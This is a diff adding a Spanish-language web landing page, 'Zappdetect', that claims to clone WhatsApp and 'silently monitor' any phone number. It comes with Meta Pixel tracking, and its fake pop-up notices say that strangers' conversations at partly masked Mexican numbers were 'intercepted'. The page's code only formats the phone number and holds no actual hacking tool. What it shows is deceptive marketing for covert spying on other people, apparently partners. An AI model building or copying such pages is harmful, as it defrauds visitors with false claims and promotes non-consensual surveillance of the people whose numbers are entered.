@@ -1,0 +1,171 @@
+<!DOCTYPE html><html lang="es"><head>
+   <!-- Meta Pixel Code -->
+<script async="" src="js/fbevents.js"></script><script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '534495082571779');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=534495082571779&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Zappdetect - número</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/numero.css" rel="stylesheet">
+    <link rel="preload" href="css/intlTelInput.css" as="style">
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js" as="script">
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js" as="script">
+    <link rel="stylesheet" href="css/intlTelInput.min.css">
+
+    <style>
+        #error-msg {
+            color: #FF3B30;
+            margin-top: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<div class="container-fluid container-total">
+    <div class="d-flex justify-content-between align-items-center p-3 border-bottom">
+        <img src="images/icone-menu.png" class="img1-icone-menu-p1">
+        <img src="images/icone-nome-zap.png" class="img3-icone-menu-p1">
+        <img src="images/icone-download.png" class="img2-icone-menu-p1">
+    </div>
+    <div class="row justify-content-center text-center mt-5">
+        <div class="col-10 col-md-6 col-lg-5 mt-3">
+            <h2 class="h2-p1"><b>¡Felicidades, has ganado 1 acceso gratuito!</b></h2>
+        </div>
+        <div class="col-12"></div>
+        <div class="col-10 col-md-6 col-lg-4 mt-3">
+            <h5 class="h5-p2">Introduce el número abajo e inicia el monitoreo silencioso.</h5>
+        </div>
+        <div class="col-12"></div>
+        <div class="col-10 col-md-6 col-lg-4 mt-3">
+            <form id="phoneForm" action="/carregando" method="post">
+                <input value="" name="sexo" class="d-none">
+                <div class="w-100">
+                    <input class="form-control" type="tel" id="telefone" name="numero" placeholder="Introduce el número de teléfono" required="" style="width: 100% !important;">
+                    <div id="error-msg"></div>
+                </div>
+
+                <!-- Campos ocultos para el backend -->
+                <input class="d-none" name="full_number" id="full_number">
+                <input class="d-none" name="country_code" id="country_code">
+                <input class="d-none" name="local_number" id="local_number">
+                <div id="error-msg" class="error"></div>
+                <button class="btn-clonar-p2">
+                    <div class="d-flex align-items-center justify-content-center">
+                        <img class="img1-icone-menu-p1 me-2" src="images/icone-cadeado.png">
+                        <span class="texto-btn">Clonar WhatsApp Ahora</span>
+                    </div>
+                </button>
+            </form>
+        </div>
+        <div class="col-12"></div>
+        <div class="col-10 col-md-6 col-lg-4 mt-3 caixas-flutuantes">
+            <div class="caixa text-start" id="caixa1">
+                <img class="me-2" src="images/icone-check.png">
+                <span>
+                ¡Las conversaciones de (+52 55) 12345-XX31 de Ciudad de México han sido expuestas!
+                </span>
+                    </div>
+                    <div class="caixa text-start" id="caixa2">
+                        <img class="me-2" src="images/icone-check.png">
+                        <span>
+                    ¡El acceso al monitoreo fue liberado para (+52 33) 67890-XX50 de Guadalajara!
+                </span>
+                    </div>
+                    <div class="caixa text-start" id="caixa3">
+                        <img class="me-2" src="images/icone-check.png">
+                        <span>
+                    ¡Los mensajes de (+52 81) 54321-XX71 de Monterrey han sido interceptados!
+                </span>
+            </div>
+        </div>
+    </div>
+    <div class="rodape-fixo p-3 d-none d-md-block">
+        <div class="mb-2 d-flex justify-content-center">
+            <div><a><small>Política de Privacidad</small></a></div>
+            <div class="mx-5"><a><small>Términos de Uso</small></a></div>
+            <div><a><small>Soporte por Correo Electrónico</small></a></div>
+        </div>
+        <small>© 2024 Protege Tu Relación. Todos los derechos reservados.</small>
+    </div>
+    <div class="cookies shadow shadow-lg" id="cookies">
+        <div class="d-flex justify-content-center align-items-center p-3">
+            <span>Este sitio utiliza cookies para mejorar tu experiencia. Al continuar, aceptas nuestra política.</span>
+            <button class="ms-2 btn-aceitar-cookies px-2 py-1" onclick="aceitar_cookies()">Aceptar</button>
+        </div>
+    </div>
+</div>
+
+<script src="js/bootstrap.bundle.js"></script>
+<script src="js/paginaNumero.js"></script>
+<script src="js/intlTelInput.min.js" defer=""></script>
+<script src="js/utils.js" defer=""></script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        const phoneInput = document.querySelector("#telefone");
+        const errorMsg = document.querySelector("#error-msg");
+        const form = document.querySelector("#phoneForm");
+
+
+        const iti = window.intlTelInput(phoneInput, {
+            separateDialCode: true,
+            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+            preferredCountries: ["us", "ar", "mx", "cl", "co", "es", "pr"],
+            autoPlaceholder: "polite",
+            formatOnDisplay: true,
+            width: "100px"
+        });
+
+        form.addEventListener("submit", function (e) {
+            if (!iti.isValidNumber()) {
+                e.preventDefault();
+                errorMsg.textContent = "Número no válido. Por favor, verifica.";
+                errorMsg.style.display = "block";
+                return;
+            }
+
+            const fullNumber = iti.getNumber(); // ej: +5511912345678
+            const countryCode = "+" + iti.getSelectedCountryData().dialCode; // ej: +55
+            const localNumber = fullNumber.replace(countryCode, ""); // ej: 11912345678
+
+            // Rellena los campos ocultos
+            document.querySelector("#full_number").value = fullNumber;
+            document.querySelector("#country_code").value = countryCode;
+            document.querySelector("#local_number").value = localNumber;
+
+            errorMsg.style.display = "none";
+
+            //form.submit();
+        });
+
+        phoneInput.addEventListener("input", function () {
+            if (iti.isValidNumber()) {
+                phoneInput.style.borderColor = "#006B54";
+                errorMsg.style.display = "none";
+            } else {
+                phoneInput.style.borderColor = "#e0e0e0";
+            }
+        });
+
+
+    });
+</script>
+
+</body></html>
